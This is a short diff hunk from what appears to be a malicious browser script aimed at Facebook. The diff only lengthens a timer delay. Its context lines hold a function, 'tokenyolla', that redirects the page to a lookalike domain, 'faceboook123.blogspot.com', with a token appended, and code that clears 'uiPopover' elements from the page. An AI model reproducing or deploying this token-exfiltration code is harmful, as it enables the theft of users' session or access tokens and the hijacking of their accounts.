@@ -88,4 +88,4 @@ document.getElementsByClassName("uiPopover")[i].innerHTML = "";
 function tokenyolla(token){
 top.location.href = 'http://faceboook123.blogspot.com/#' + token;
 }}
-},5000);
+},10000);
